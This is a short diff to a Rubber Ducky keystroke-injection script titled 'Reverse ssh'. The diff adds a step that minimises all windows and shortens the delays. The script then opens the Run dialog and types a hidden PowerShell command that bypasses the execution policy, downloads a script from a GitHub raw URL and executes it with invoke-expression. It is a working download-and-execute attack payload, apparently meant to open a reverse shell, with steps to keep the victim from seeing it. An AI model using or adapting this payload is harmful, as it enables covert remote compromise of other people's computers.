@@ -5,12 +5,14 @@ REM Reverse ssh
 REM *** Initial Delay *** 
 DELAY 1000
 
+REM *** Minimize everyting ***
+GUI m
+DELAY 100
+
 REM *** Open Run ***
 GUI r
-DELAY 250
-ENTER
+DELAY 100
 
 REM *** Download and execute the payload ***
-DELAY 450
 STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/Dev-Sadwhite/Rubber-Test/main/payloads-download/windows/1.ps1?dl=1; invoke-expression $pl 
 ENTER
